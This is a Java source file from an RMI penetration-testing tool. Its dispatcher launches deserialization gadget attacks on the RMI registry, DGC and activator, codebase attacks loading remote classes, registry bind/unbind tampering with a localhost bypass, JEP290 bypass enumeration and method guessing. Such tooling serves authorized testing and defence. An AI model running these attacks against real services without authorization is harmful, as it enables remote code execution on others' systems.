package de.qtc.rmg.operations;

import java.io.IOException;
import java.rmi.NoSuchObjectException;
import java.rmi.server.ObjID;
import java.util.ArrayList;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import de.qtc.rmg.annotations.Parameters;
import de.qtc.rmg.exceptions.UnexpectedCharacterException;
import de.qtc.rmg.internal.ArgumentParser;
import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.internal.RMGOption;
import de.qtc.rmg.io.Formatter;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.SampleWriter;
import de.qtc.rmg.io.WordlistHandler;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.YsoIntegration;
import javassist.CannotCompileException;
import javassist.NotFoundException;

/**
 * The dispatcher class contains all method definitions for the different rmg actions. It obtains a reference
 * to the ArgumentParser object and extracts all required arguments parameters for the corresponding method calls.
 *
 * Methods within the Dispatcher class can be annotated with the Parameters annotation to specify additional requirements
 * on their expected arguments. Refer to the de.qtc.rmg.annotations.Parameters class for more details.
 *
 * To add a new operation to rmg, the operation  must first be registered within the de.qtc.rmg.operations.Operation class.
 * A new Operation needs to be created there that references the corresponding method within this class.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class Dispatcher {

    private RMIWhisperer rmi;
    private ArgumentParser p;

    private String[] boundNames = null;
    private MethodCandidate candidate = null;
    private HashMap<String,String> allClasses = null;
    private HashMap<String,String>[] boundClasses = null;

    /**
     * Creates the dispatcher object.
     *
     * @param p ArgumentParser object that contains the current command line specifications
     */
    public Dispatcher(ArgumentParser p)
    {
        this.p = p;
        rmi = new RMIWhisperer(p.getHost(), p.getPort());

        if(p.containsMethodSignature())
            this.createMethodCandidate();
    }

    /**
     * Obtains a list of bound names from the RMI registry. Additionally, each object is looked up to obtain
     * the name of the class that it implements. All results are saved within of class variables within the
     * Dispatcher class.
     *
     * @throws java.rmi.NoSuchObjectException is thrown when the specified RMI endpoint is not a registry
     */
    @SuppressWarnings("unchecked")
    private void obtainBoundNames() throws NoSuchObjectException
    {
        if(boundNames != null && boundClasses != null && allClasses != null)
            return;

        rmi.locateRegistry();
        boundNames = rmi.getBoundNames(RMGOption.BOUND_NAME.getString());

        boundClasses = new HashMap[] { new HashMap<String,String>(), null };
        for(String name : boundNames)
            boundClasses[0].put(name, null);
    }

    @SuppressWarnings("unchecked")
    private void obtainBoundObjects() throws NoSuchObjectException
    {
        if( boundNames == null )
            obtainBoundNames();

        boundClasses = rmi.lookup(boundNames);
        allClasses = (HashMap<String, String>)boundClasses[0].clone();
        allClasses.putAll(boundClasses[1]);
    }

    /**
     * Creates a method candidate from the specified signature on the command line.
     */
    private void createMethodCandidate()
    {
        String signature = RMGOption.SIGNATURE.getString();

        try {
            candidate = new MethodCandidate(signature);

        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.invalidSignature(signature);
        }
    }

    /**
     * A RemoteObjectClient is used for communication to user registered RMI objects (anything other than
     * registry, DGC or activator). This function returns a corresponding object that can be used for the
     * communication. If an ObjID was specified on the command line, this ObjID is used as a target. Otherwise
     * the client needs to be created for one particular bound name.
     *
     * @param boundName to create the client for. If ObjID was specified on the command line, it is preferred.
     * @return RemoteObjectClient that can be used to communicate to the specified RMI object
     */
    private RemoteObjectClient getRemoteObjectClient()
    {
        if( RMGOption.OBJID.notNull() ) {
            ObjID objID = RMGUtils.parseObjID(RMGOption.OBJID.getString());
            return new RemoteObjectClient(rmi, objID);

        } else {
            return new RemoteObjectClient(rmi, RMGOption.BOUND_NAME.getString());
        }
    }

    /**
     * Is expected to be called other the method guessing. Takes a HashMap of bound name -> [MethodCandidaite]
     * pairs and writes sample files for each bound name. The sample files contain Java code that can be used to
     * call the corresponding remote methods.
     *
     * @param results HashMap of bound name -> [MethodCanidate] pairs
     */
    private void writeSamples(Map<String,ArrayList<MethodCandidate>> results)
    {
        String templateFolder = RMGOption.TEMPLATE_FOLDER.getString();
        String sampleFolder = RMGOption.SAMPLE_FOLDER.getString();
        boolean sslValue = RMGOption.SSL.getBool();
        boolean followRedirect = RMGOption.FOLLOW.getBool();

        Logger.println("");
        Logger.println("Starting creation of sample files:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            String className;
            boolean unknownClass = false;
            SampleWriter writer = new SampleWriter(templateFolder, sampleFolder, sslValue, followRedirect);

            for(String name : results.keySet()) {

                if( name.contains("(==") )
                    continue;

                Logger.printlnMixedYellow("Creating samples for bound name", name + ".");
                Logger.increaseIndent();

                className = allClasses.get(name);

                if(boundClasses[1].keySet().contains(name)) {
                    writer.createInterface(name, className, (List<MethodCandidate>)results.get(name));
                    unknownClass = true;
                }

                writer.createSamples(name, className, unknownClass, (List<MethodCandidate>)results.get(name), rmi);

                Logger.decreaseIndent();
            }

        } catch (IOException | CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "sample", "creation", true);

        } catch (UnexpectedCharacterException e) {
            Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
            Logger.eprintln("This is caused by special characters within bound- or classes names.");
            Logger.eprintlnMixedYellow("You can enforce sample cration with the", "--trusted", "switch.");
            RMGUtils.exit();
        }

        Logger.decreaseIndent();
    }

    /**
     * Parses the user specified wordlist options and creates a corresponding list of MethodCandidates.
     *
     * @return HashSet of MethodCandidates that should be used during guessing operations
     */
    private Set<MethodCandidate> getCandidates()
    {
        Set<MethodCandidate> candidates = new HashSet<MethodCandidate>();

        String wordlistFile = RMGOption.WORDLIST_FILE.getString();
        String wordlistFolder = RMGOption.WORDLIST_FOLDER.getString();
        boolean zeroArg = RMGOption.ZERO_ARG.getBool();
        boolean updateWordlist = RMGOption.UPDATE.getBool();

        if( candidate != null ) {
            candidates.add(candidate);

        } else {

            try {
                WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlist, zeroArg);
                candidates = wlHandler.getWordlistMethods();
            } catch( IOException e ) {
                Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
                ExceptionHandler.stackTrace(e);
                RMGUtils.exit();
            }
        }

        return candidates;
    }

    /**
     * Dispatches the listen action. Basically just a handover to ysoserial.
     */
    @Parameters(count=4)
    public void dispatchListen()
    {
        YsoIntegration.createJRMPListener(p.getHost(), p.getPort(), p.getGadget());
    }

    /**
     * Performs the gadgetCall operation on an ActivatorClient object. Used for deserialization
     * attacks on the activator.
     */
    @Parameters(count=4)
    public void dispatchActivator()
    {
        ActivationClient act = new ActivationClient(rmi);
        act.gadgetCall(p.getGadget());
    }

    /**
     * Performs the gadgetCall operation on a RegistryClient object. Used for deserialization
     * attacks on the registry.
     */
    @Parameters(count=4)
    public void dispatchRegistry()
    {
        String regMethod = p.getRegMethod();
        boolean localhostBypass = RMGOption.LOCALHOST_BYPASS.getBool();

        RegistryClient reg = new RegistryClient(rmi);
        reg.gadgetCall(p.getGadget(), regMethod, localhostBypass);
    }

    /**
     * Performs the gadgetCall operation on a DGCClient object. Used for deserialization
     * attacks on the DGC.
     */
    @Parameters(count=4)
    public void dispatchDGC()
    {
        String dgcMethod = p.getDgcMethod();

        DGCClient dgc = new DGCClient(rmi);
        dgc.gadgetCall(dgcMethod, p.getGadget());
    }

    /**
     * Performs the gadgetCall operation on a RemoteObjectClient object. Used for deserialization
     * attacks on user registered RMI objects. Targets can be specified by bound name or ObjID.
     */
    @Parameters(count=3, requires= {RMGOption.TARGET, RMGOption.SIGNATURE})
    public void dispatchMethod()
    {
        int argumentPosition = RMGOption.ARGUMENT_POS.getInt();

        RemoteObjectClient client = getRemoteObjectClient();
        client.gadgetCall(candidate, p.getGadget(), argumentPosition);
    }

    /**
     * Performs the genericCall operation on a RemoteObjectClient object. Used for legitimate
     * RMI calls on user registered RMI objects. Targets can be specified by bound name or ObjID.
     */
    @Parameters(count=3, requires= {RMGOption.TARGET, RMGOption.SIGNATURE})
    public void dispatchCall()
    {
        Object[] argumentArray = p.getCallArguments();

        RemoteObjectClient client = getRemoteObjectClient();
        client.genericCall(candidate, argumentArray);
    }

    /**
     * Performs a codebase attack. The actual target is determined by the value of the --signature
     * option. If the signature is a real method signature, a target needs to  be specified by
     * bound name or ObjID. Otherwise, the --signature is expected to be one of act, dgc or reg.
     */
    @SuppressWarnings("deprecation")
    @Parameters(count=4, requires= {RMGOption.SIGNATURE})
    public void dispatchCodebase()
    {
        String className = p.getPositionalString(3);
        RMGUtils.setCodebase(p.getPositionalString(4));

        String signature = RMGOption.SIGNATURE.getString();
        int argumentPosition = RMGOption.ARGUMENT_POS.getInt();

        Object payload = null;

        try {
            payload = RMGUtils.makeSerializableClass(className);
            payload = ((Class<?>)payload).newInstance();

        } catch (CannotCompileException | InstantiationException | IllegalAccessException e) {
            ExceptionHandler.unexpectedException(e, "payload", "creation", true);
        }

        if( candidate != null ) {

            if( !RMGOption.BOUND_NAME.notNull() ) {
                ExceptionHandler.missingBoundName("codebase");
            }

            RemoteObjectClient client = getRemoteObjectClient();
            client.codebaseCall(candidate, payload, argumentPosition);

        } else if( signature.matches("dgc") ) {

            DGCClient dgc = new DGCClient(rmi);
            dgc.codebaseCall(RMGOption.DGC_METHOD.getString(), payload);

        } else if( signature.matches("reg") ) {
            RegistryClient reg = new RegistryClient(rmi);
            reg.codebaseCall(payload, RMGOption.REG_METHOD.getString(), RMGOption.LOCALHOST_BYPASS.getBool());

        } else if( signature.matches("act") ) {
            ActivationClient act = new ActivationClient(rmi);
            act.codebaseCall(payload);

        } else {
            ExceptionHandler.internalError("dispatchCodebase", "Unknown signature value " + signature + " was passed.");
        }
    }

    /**
     * Performs the bind operation on the RegistryClient object. Binds the user specified gadget to
     * the targeted registry.
     */
    @Parameters(count=4, requires= {RMGOption.BOUND_NAME})
    public void dispatchBind()
    {
        String boundName = RMGOption.BOUND_NAME.getString();

        RegistryClient reg = new RegistryClient(rmi);
        reg.bindObject(boundName, p.getGadget(), RMGOption.LOCALHOST_BYPASS.getBool());
    }

    /**
     * Performs the rebind operation on the RegistryClient object. Binds the user specified gadget to
     * the targeted registry.
     */
    @Parameters(count=4, requires= {RMGOption.BOUND_NAME})
    public void dispatchRebind()
    {
        String boundName = RMGOption.BOUND_NAME.getString();

        RegistryClient reg = new RegistryClient(rmi);
        reg.rebindObject(boundName, p.getGadget(), RMGOption.LOCALHOST_BYPASS.getBool());
    }

    /**
     * Performs the unbind operation on the RegistryClient object. Removes a bound name from the
     * targeted registry endpoint.
     */
    @Parameters(requires= {RMGOption.BOUND_NAME})
    public void dispatchUnbind()
    {
        String boundName = RMGOption.BOUND_NAME.getString();

        RegistryClient reg = new RegistryClient(rmi);
        reg.unbindObject(boundName, RMGOption.LOCALHOST_BYPASS.getBool());
    }

    /**
     * Performs rmg's enumeration action. During this action, several different vulnerability types
     * are enumerated.
     */
    public void dispatchEnum()
    {
        RMGUtils.enableCodebase();

        DGCClient dgc = new DGCClient(rmi);
        RegistryClient registryClient = new RegistryClient(rmi);
        EnumSet<ScanAction> actions = p.getScanActions();

        boolean enumJEP290Bypass = true;
        boolean marshal = true;

        Logger.printlnYellow("Starting RMI Enumeration:");
        Logger.increaseIndent();

        try {

            if( actions.contains(ScanAction.LIST) ) {
                obtainBoundNames();

                if( !RMGOption.SSRFResponse.notNull() || RMGOption.BOUND_NAME.notNull() )
                    obtainBoundObjects();

                Formatter format = new Formatter();
                Logger.println("");
                format.listBoundNames(boundClasses, rmi);

                Logger.println("");
                format.listCodeases();
            }

            if( actions.contains(ScanAction.STRING_MARSHALLING) ) {
                Logger.println("");
                marshal = registryClient.enumerateStringMarshalling();
            }

            if( actions.contains(ScanAction.CODEBASE) ) {
                Logger.println("");
                registryClient.enumCodebase(marshal, RMGOption.REG_METHOD.getString(), RMGOption.LOCALHOST_BYPASS.getBool());
            }

            if( actions.contains(ScanAction.LOCALHOST_BYPASS) ) {
                Logger.println("");
                registryClient.enumLocalhostBypass();
            }

        } catch( java.rmi.NoSuchObjectException e ) {
            ExceptionHandler.noSuchObjectExceptionRegistryEnum();
            enumJEP290Bypass = false;
        }

        if( actions.contains(ScanAction.DGC) ) {
            Logger.println("");
            dgc.enumDGC(RMGOption.DGC_METHOD.getString());
        }

        if( actions.contains(ScanAction.JEP290) ) {
            Logger.println("");
            dgc.enumJEP290(RMGOption.DGC_METHOD.getString());
        }

        if(enumJEP290Bypass && actions.contains(ScanAction.JEP290_BYPASS) ) {
            Logger.println("");
            registryClient.enumJEP290Bypass(RMGOption.REG_METHOD.getString(), RMGOption.LOCALHOST_BYPASS.getBool(), marshal);
        }

        if( actions.contains(ScanAction.ACTIVATOR) ) {
            Logger.println("");
            ActivationClient activationClient = new ActivationClient(rmi);
            activationClient.enumActivator();
        }
    }

    /**
     * Performs a method guessing attack. During this operation, the specified wordlist files are parsed
     * for valid method definitions and each method is invoked on the targeted RMI endpoint. Currently, this
     * operation is only supported on registry endpoints and cannot be performed using the --objid option.
     */
    public void dispatchGuess()
    {
        Formatter format = new Formatter();
        Set<MethodCandidate> candidates = getCandidates();

        try {
            obtainBoundObjects();
        } catch( java.rmi.NoSuchObjectException e ) {
            ExceptionHandler.noSuchObjectException(e, "registry", true);
        }

        MethodGuesser guesser = new MethodGuesser(rmi, this.boundClasses, candidates);
        guesser.printGuessingIntro();

        Map<String, ArrayList<MethodCandidate>> results = guesser.guessMethods();

        Logger.decreaseIndent();
        format.listGuessedMethods(results);

        if(results.size() > 0 && RMGOption.CREATE_SAMPLES.getBool())
            this.writeSamples(results);
    }
}
